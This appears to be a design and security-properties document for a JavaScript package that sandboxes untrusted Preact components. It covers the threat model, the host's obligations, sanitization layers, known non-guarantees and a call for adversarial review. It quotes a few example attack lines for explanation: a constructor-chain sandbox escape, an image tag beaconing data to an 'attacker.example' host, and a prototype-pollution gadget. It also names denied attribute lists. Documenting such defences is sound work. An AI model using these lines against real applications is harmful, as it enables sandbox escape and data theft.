# Security properties of `@endo/preact-container`

This document states the security properties this package is *designed* to
provide, the assumptions they rest on, and — just as importantly — what is
**not** claimed.
It describes what the code does today, not what we hope it will do.
It ends with an explicit invitation to adversarial review; please read that
section as a request, not a formality.

Status: **experimental / pre-audit**.
The confinement claims below have been exercised by an in-house attack-oriented
test suite (see "Where the claims are tested"), but they have **not** yet been
adversarially reviewed by the SES/ocap community.
Do not rely on this boundary for high-stakes isolation until that review has
happened.

## What this package is

A way to mount untrusted Preact component code inside an ordinary Preact tree
in the **same realm and origin** as the host — "Compartment, not iframes".
The untrusted code is a function of shape `(endowments, props) => vnodes`,
typically produced by evaluating attacker-supplied source in a SES
`Compartment` (the host does the evaluating; this package never calls
`new Compartment` itself and stays SES-agnostic).
Two cooperating layers defend the seam between that function and the live DOM:

- `src/compartment.js` (`confineComponent`) coerces whatever the guest
  function returns — rebuilding it with primitives this package controls —
  and manages host-trusted content threaded through the guest
  (`OpaqueChild`, `sealComponent`).
- `src/renderer.js` (`renderConfined`) sanitizes every vnode that renders
  inside the confined subtree: refs stripped, tag and attribute allowlists,
  URL-scheme checks, event-listener wrapping.

On top of those sit three small application-level modules that exercise the
same primitives: `security-pattern.js` (an unspoofable per-user badge),
`petname.js` (render the host's local name for a party without disclosing the
address book), and `composition.js` (multi-party regions with frame-placed
attribution), with `party-identity.js` supplying designation-by-object
identity for all of them.

## Threat model

**Attacker.**
The author of a confined component: an LLM-authored widget, a third-party
plugin, a forked component someone else edited.
The attacker controls the component's entire source and therefore its render
results: arbitrary values, hand-built vnode-shaped objects (bypassing `h()`),
Proxies, objects with throwing or side-effecting getters, pathological
nesting, hostile `style` bags, re-entrant `setState`-during-render, and
thrown exceptions.
Multiple mutually-suspicious confined components may share one page
(multi-tenant), so tenant-to-tenant isolation is in scope, not just
guest-to-host.

**Not the attacker.**
The host application, the Preact library, the browser, and every other script
the host chooses to load in the page are **trusted**.
This package does not defend the host against itself, against a compromised
dependency of the host, or against other host-realm scripts that mutate
Preact's global `options` hooks after installation.

**Goal of the attacker.**
Reach a live DOM node or DOM `Event`; execute script in the host realm; read
or forge host-owned content threaded through it (petnames, trust badges,
attribution marks); read or write another tenant's state; escalate a render
into ambient authority (network, storage, caps) the host never granted.

## Hard preconditions — the host's obligations

The properties below are **conditional**.
Each precondition, if violated, voids specific claims; none of them is
enforced for you beyond the noted fail-fasts.

1. **SES lockdown, before evaluating any guest source**:
   `lockdown({ overrideTaming: 'severe' })`.
   Without lockdown, every endowment handed to the guest exposes the host
   realm's `Function` via its `.constructor` chain
   (`endowments.h.constructor('return globalThis')()`), and the sandbox is
   decorative.
   `confineComponent` emits a one-time `console.warn` when it cannot detect
   lockdown — a warning, not a refusal.
   Sibling (tenant-to-tenant) opacity **also** requires lockdown: without
   `harden`, the shared endowment functions fall back to a shallow
   `Object.freeze`, leaving `h.prototype` a writable channel between tenants
   (pinned as a known limitation in `test/sibling-opacity.test.js`).
2. **The page's CSP must actually allow SES's function-constructor taming to
   engage** (in practice: `'unsafe-eval'`).
   Under a strict `default-src 'self'` CSP, `lockdown()` freezes intrinsics
   but `tameFunctionConstructors` silently no-ops, leaving the
   `.constructor` escape live while everything *looks* locked down.
   This coupling is invisible to this package; the host must verify it
   (e.g. probe that `h.constructor('return 1')` throws after lockdown).
3. **Mount through `renderConfined`.**
   The attribute allowlist lives in the renderer; a `confineComponent`
   wrapper mounted via plain `preact.render` would silently skip it.
   This one *is* enforced: a confined component rendered outside a
   `renderConfined` tree throws synchronously (an unforgeable ancestor walk
   for the module-private `SecureBoundary`), and defining a confined
   component arms that check even before any `renderConfined` call.
4. **Pass `strictStyle: true` for untrusted trees** if your threat model
   includes CSS-based overlay or exfiltration (see "Styling" below).
   The default profile admits arbitrary `style` values.
5. **Seal once per kind, not per render.**
   `sealComponent` / `sealPetName` / `sealPatternBadge` placeholders register
   as trusted-exit types and are strongly referenced for the life of the
   page; minting per render leaks memory and grows the privileged set.
6. **Do not register attacker-reachable functions** with the exported
   `_registerTrustedExitType` / `_registerSecureReentryType` hooks; they are
   privileged extension points for sibling layers, not application API.

## Designed properties, and where each is enforced

### 1. No DOM reach

The guest never receives a DOM node, a DOM `Event`, or any object from which
one is reachable.

- `ref` is stripped twice: the renderer nulls `vnode.ref` on every sanitized
  vnode, and the coercer drops `ref` props from hand-built vnodes that never
  passed through `h()` (`DROPPED_PROPS_ALWAYS`).
- Event handlers registered by the guest are invoked with a frozen
  `SafeEvent` facade, never the real event.
  The facade copies a **fixed allowlist of spec-guaranteed-primitive**
  properties (key/modifier/mouse/coordinate/pointer/wheel); `target` and
  `currentTarget` are flat frozen snapshots (`tagName`, `id`, `value`, …)
  with no path back to the element; `relatedTarget`, `view`, `srcElement`,
  `composedPath()` are absent.
  `preventDefault` / `stopPropagation` / `stopImmediatePropagation` are
  provided as closures over the real event.
- Drag events expose a string-only `SafeDataTransfer` facade
  (`getData`/`setData`/`clearData`/`types`/effect enums) — never the real
  `DataTransfer`, whose `.files` / `.items[i].webkitGetAsEntry()` are read
  capabilities to the user's dropped files, and never `setDragImage` (a DOM
  sink).
  `clipboardData` is deliberately not mirrored at all.

### 2. Props in, vnodes out — the render is a pure data exchange

The guest is called as `(endowments, props)` and its return value is treated
as untrusted data, not as vnodes.

- `endowments` is the only vocabulary the guest is handed: `h`, `Fragment`,
  and six hooks, transitively hardened under lockdown (lazily, at first
  confine after lockdown, because module evaluation runs before the host's
  `lockdown()` call).
- The return value is **walked once and rebuilt** (`coerceToSafeVNode`):
  every field read defensively (throwing getters → drop), non-vnode shapes
  dropped, props copied into null-prototype bags, `style` shallow-copied via
  data descriptors only (accessors never fire during Preact's commit),
  `key` coerced to a primitive, recursion capped at depth 256 (fail closed
  on pathological nesting).
  The guest's original objects are discarded; Preact only ever diffs objects
  this package built.
- Function-typed `vnode.type` from the guest is admitted **by identity
  only**: another confined wrapper, `OpaqueChild`, or a sealed placeholder.
  Everything else (host component functions, class constructors, Proxies)
  becomes `Fragment`.
  Marker *flags* (`_isSecureExit` etc.) are never trusted — flag-trusting is
  the documented CVE class in the ancestry of this code.

### 3. No HTML injection, no dangerous elements or attributes

- Tag allowlist (default ~90 benign content tags; no `script`, `iframe`,
  `object`, `embed`, `template`, `slot`, `base`, `meta`, `link`, `style`,
  `svg`/`math` namespaces).
  Disallowed tags are replaced by `Fragment` — children render, the element
  does not.
- **Allow-by-default attribute allowlist** — the structural inversion of the
  usual denylist: an attribute name not explicitly admitted is dropped, so
  the next dangerous DOM setter the platform ships is not exploitable by
  default.
  `aria-*` and `data-*` (with non-empty suffix) are always admitted.
- `HARD_DENY_ATTRS` refuses opt-in even via the host's `allowedAttrs`
  extension: HTML-injection sinks (`innerHTML`, `srcdoc`,
  `dangerouslySetInnerHTML`, …), the `HTMLHyperlinkElementUtils` live URL
  setters, every `on*`-shaped name, `nonce`, `is`, `formtarget`,
  `attributionsrc`, `inert`.
  Attempting to add one **throws synchronously**, so a config typo (or an
  attacker-controlled allowlist upstream of the host) is a CI failure, not a
  silent XSS.
- URL-valued attributes are scheme-checked (allowlist:
  `https?:`/`mailto:`/`tel:`/`sms:`/`ftp:`/relative/`#`/`?`, plus
  `data:image/*` for `src`/`poster` only); `srcset` and `ping` get
  list-aware parsing so secondary URLs cannot ride in on a passing first
  entry; `javascript:` and unknown schemes fail closed.
- Case-variant attacks are closed: lookups lowercase the key, only canonical
  lowercase `on*` props (and only function values) are admitted and wrapped,
  and duplicate case-variants of an admitted attribute are dropped
  (first-occurrence-wins) so an attacker casing cannot displace a sanitized
  slot — including the forced `rel="noopener noreferrer"` written when a
  host has opted `target` in and the guest uses `_blank`.
- Prototype-pollution hardening: sanitized props bags and style bags are
  rebuilt with `Object.create(null)` from own-property reads, so a host-page
  gadget like `Object.prototype.dangerouslySetInnerHTML = …` or
  `Object.prototype.backgroundImage = 'url(...)'` cannot reach Preact's
  `for…in` diff loops through inheritance.
- Every sanitization read of guest-controlled shape is wrapped so hostile
  Proxies/getters degrade to dropped props or empty bags, never to an
  aborted host render (no sanitizer-as-DoS).

### 4. Host-owned state; trusted content threaded through untrusted trees

The guest positions host content; it never holds it.

- `OpaqueChild`: host-supplied `children` are replaced by sentinel vnodes;
  the real vnode lives in a per-render slot map keyed by an unforgeable
  frozen slot object, cleared when the diff completes, so a stashed slot is
  useless across renders and across tenants (regression-tested: cross-mount
  slot reuse).
  A one-shot invocation token, armed only by the diff Preact itself drives
  and compared against the exact props object, makes a direct synchronous
  call from guest code return `null` instead of exfiltrating the host vnode
  as a JS value.
- `sealComponent(hostFn, { params })` — the trusted-in-untrusted pattern —
  extends that to *parameterized* host content ("render the local name for
  THIS id").
  Four properties, all by construction: the guest **cannot inspect** the
  host's output (Preact renders it; the placeholder is not the host
  function), **cannot invoke it for a value** (same token discipline),
  **cannot parameterize beyond the declared contract** (only declared param
  names cross, each read once and coerced to a primitive — no functions,
  objects, or getter-bearing values, so no capability rides in and no
  undeclared prop like `onClick` is smuggled), and **cannot forge one**
  (identity in a private WeakSet, never a flag).
  A throwing sealed host function renders nothing rather than breaking the
  host render.
- `security-pattern.js` addresses what sealing alone cannot: a guest can
  always draw *its own* pixels that imitate trusted chrome.
  The badge renders a pattern derived from a secret the guest cannot
  observe (under lockdown the compartment has no ambient globals, so
  app-origin storage is out of reach), so an imitator draws blind.
  Guest-supplied text renders beside the pattern, never inside it, and the
  badge's style is inline so surrounding untrusted CSS cannot restyle or
  hide it.
  Storage denial fails to a per-session secret, never to "no pattern".
- `party-identity.js` / `petname.js` / `composition.js`: parties are
  designated by **object**, crossing the primitives-only seam as opaque,
  unguessable, per-boundary minted handles (WeakMap-held, never persisted or
  rendered) — not as global, guessable string ids.
  Unknown handles resolve to "unattributed"/"unnamed", never to
  attacker-supplied fallback text.
  The composition frame places all attribution marks itself; a party is
  never handed the `Attribution` component (which would let it claim any
  name), and unconfined region content is visibly refused rather than
  rendered with host authority under someone else's mark.

### 5. Styling, spatial containment, and CSS exfiltration (`strictStyle`)

With `strictStyle: true`, the `style` value (object *or* string) is filtered
to a property allowlist (`SAFE_STYLE_PROPS`) that contains:

- **no positioning/stacking properties** (`position`, `z-index`, `inset`,
  `top`…, `transform`), so a confined component lays out in normal flow
  inside its clipped mount box and structurally cannot overlay the host's
  trusted-path or consent chrome; and
- **no url()-accepting property** (`background`, `background-image`,
  `mask*`, `border-image*`, `cursor`, `content`, `list-style-image`) and no
  custom properties (`--x`, which would allow `var()` indirection), so
  guest styles cannot fire ambient CSS fetches.

This reproduces the iframe's free spatial and CSS-network containment **by
construction** rather than by a bypassable value filter — the design point is
"the component controls no property whose value is a URL", because escaping
and `image-set()` will always outrun a filter.

**With `strictStyle` false (the default), none of this paragraph applies**:
`style` is admitted as an arbitrary (null-protoized, accessor-stripped) bag,
including `position: fixed` and `background-image: url(...)`.

### 6. Containment bookkeeping is attack-aware

The sanitizer's scoping state (secure depth, trusted-exit depth, per-tree
allowlist stacks, slot-map brackets) is bracketed per-vnode with idempotency
flags, unwound on `options.diffed` *and* on Preact's error path
(`_catchError`), so a guest that throws mid-render or loops
`setState`-during-render cannot leave sanitization disabled or misapplied for
subsequent host renders.
Trusted-exit and secure-reentry membership are identity-based sets;
registering one function as both throws (the dual-registration would allow a
sanitization flip mid-render).
`Confined` wrappers are secure-*reentry* types, so an attacker rendered
inside a host `HostPassthrough` island is still sanitized.

## What is NOT claimed

Read this section as carefully as the previous one.

- **Not an origin, process, or memory boundary.**
  Guest and host share a realm, an event loop, and an origin.
  This is one layer of defense-in-depth; it is not a substitute for a
  Content-Security-Policy, an iframe/origin boundary, or a process boundary
  where the threat model demands one.
- **Network exfiltration through allowed content is possible.**
  The URL sanitizer checks *schemes*, not hosts: `https://attacker.example/`
  is a valid `src`.
  A confined component that holds interesting data (its own props) can
  beacon it out via `<img src="https://attacker.example/?d=...">`, `<a
  ping>`, media auto-fetch, or a cross-origin `action` — merely by the
  element being in the tree.
  `strictStyle` closes the *CSS* fetch channel only.
  Blocking content-driven network egress requires a CSP (`img-src`,
  `connect-src`, `form-action`, …) layered by the host.
- **Timing and covert channels are out of scope and unanalyzed.**
  Guests share the main thread and receive `timeStamp` on events; nothing
  here addresses cross-tenant or guest↔host communication through timing,
  scheduling, memory pressure, or other side channels.
- **Denial of service is not prevented.**
  A guest render can loop forever or allocate unboundedly on the shared main
  thread; there is no preemption, quota, or watchdog.
  The coercion depth cap bounds one recursion, not guest computation.
- **Pixel forgery is not prevented by confinement.**
  A guest can draw a convincing imitation of any host UI *within its own
  box*.
  The security-pattern badge makes the real article *recognizable* to a user
  who has learned their pattern; it does not stop the forgery being drawn,
  and it does not help a user who never looks.
- **The default (non-strict) style profile leaves the styling channel
  open** — overlay/phishing within the page and CSS-fetch exfiltration are
  live unless the host passes `strictStyle: true`.
  Layout-inference attacks in general (what a guest can *learn* through
  styling and inherited theme variables) have not been systematically
  analyzed, in either profile.
- **Without lockdown the boundary is decorative**, and the package only
  warns (once, on `console.warn`); it does not refuse.
  Hosts wanting refusal must gate on lockdown themselves.
- **Preact-internals coupling.**
  The renderer keys off Preact's *mangled* internal names (`options.__r`,
  `options.__e`, `vnode.__`) and the semantics of Preact's options hooks and
  diff loop (including the `setState`-in-render do-while).
  These have been stable across Preact 10.x, but a Preact release could
  shift them; the failure mode of a missed hook is **silent
  under-sanitization**, which is the wrong direction to fail.
  This coupling deserves its own pinning tests upstream.
- **The `options` hooks are global mutable state in the host realm.**
  Any *host-trusted* script that later overwrites `options.__r`/`options.diffed`
  without chaining disables sanitization.
  That is within the trust model (the host is trusted), but it makes the
  integrity of the boundary depend on the host's whole script set, and is
  worth an auditor's attention.
- **`HostPassthrough` and the `_register*` hooks are sharp.**
  `HostPassthrough` disables sanitization for its subtree by design; handing
  it (or the registration hooks) to attacker-reachable code voids
  everything.
  The package keeps them un-forgeable, not un-misusable.
- **One known anomaly**: a sealed placeholder rendered *directly at the host
  root* (rather than placed by a confined child, which is its contract) has
  shown order-dependent behavior in tests — suspected install/hook-arming
  order on first render.
  It is deliberately not relied upon, but it is an unexplained wrinkle in
  the install path of a security primitive and is flagged here for that
  reason.

## Where the claims are tested

The suite runs the real renderer in real headless Chromium (Vitest +
Playwright), and the security tests are written *as the attacks*:

- `test/secure.test.js`, `test/handlers.test.js` — renderer sanitization:
  refs, tags, attributes, URL and srcset/ping parsing, case variants,
  SafeEvent/SafeDataTransfer surfaces, noopener forcing, pollution gadgets.
- `test/confine.test.js` — coercer: hand-built vnodes, Proxies, hostile
  getters, depth bombs, identity gates, opaque children, cross-mount slot
  reuse, mounted-outside-`renderConfined` fail-fast.
- `test/sealed.test.js`, `test/security-pattern.test.js` — the
  sealed-component properties, each written as its exfiltration or forgery
  attempt.
- `test/sibling-opacity.test.js` — multi-tenant: shared-endowment channels
  (with and without lockdown; the no-lockdown limitation is pinned, not
  hidden), slot and token reuse across tenants.
- `test/petname.test.js`, `test/composition.test.js` — designation by
  object, unknown-handle fallbacks, frame-placed attribution, refusal of
  unconfined regions.
- `test/secure-lavatube.test.js`, `test/compartment-lavatube.test.js` —
  heap-walk reachability checks (via `@lavamoat/lavatube`) that no DOM node
  is transitively reachable from what the guest holds.
- `test/cold-install.test.js` — hook arming before any `renderConfined`
  call.

A green suite here means "the attacks we thought of fail", nothing stronger.

## Invitation to adversarial review

We are asking for hostile eyes before anyone relies on this.

If you are reading this as an Endo/SES/ocap reviewer: the confinement claims
above are exactly the kind that history says should not be believed on the
author's say-so, and several of them live at awkward seams — a retrofitted
sanitizer over a framework's internal hooks, a same-realm boundary whose
strength is conditional on lockdown *and* on CSP details the package cannot
see, and a small privileged extension surface (`HostPassthrough`, the
`_register*` hooks, `allowedAttrs`/`allowedTags`) whose misuse is not
mechanically prevented.

Particularly valuable targets, in rough order of payoff:

1. **Escape the coercer or the sanitizer**: produce a value from a confined
   function that reaches the DOM as a live element with an un-sanitized
   attribute, an un-wrapped listener, or a surviving ref — especially via
   Preact behaviors this package's bracketing does not model (Suspense /
   `preact/compat`, concurrent re-entry, error boundaries,
   `setState`-in-render edge cases, hook-order effects).
2. **Break the bracketing**: leave `secureRenderDepth` / `trustedExitDepth`
   / the allowlist stacks unbalanced through some throw/re-render
   interleaving, so a *later* host render runs sanitized-off or
   wrongly-sanitized.
3. **Defeat a token**: obtain a host vnode or sealed output as a JS value
   despite the single-flight invocation tokens (re-entrancy, aliased props
   bags, scheduling games).
4. **Cross a tenant boundary under lockdown**: any read/write channel
   between two confined components beyond what their host wired
   (endowment graph, slot maps, party handles, the WeakSet/WeakMap
   registries).
5. **Beat the URL/list parsers**: any string admitted by `sanitizeUrl` /
   `sanitizeUrlList` that a browser interprets as a scheme or URL the
   allowlist intended to exclude (parser differentials are the expected
   shape here — the srcset comma case in the code comments is the model).
6. **Void `strictStyle`**: express positioning/stacking or a CSS-driven
   fetch using only allowlisted properties (or property/value corners we
   missed), in any browser.
7. **Poke the trust anchors**: `SecureBoundary` privacy, identity-set
   discipline, the lazily-hardened endowments window (module eval →
   lockdown → first confine), and the sealed-at-host-root anomaly above.

Findings that break a stated claim are vulnerabilities; findings that break
an *unstated assumption you had to reconstruct* are documentation bugs, and
we want both.
Please report per `SECURITY.md` in this package (coordinated disclosure), or
open a public issue for anything already covered by "What is NOT claimed".
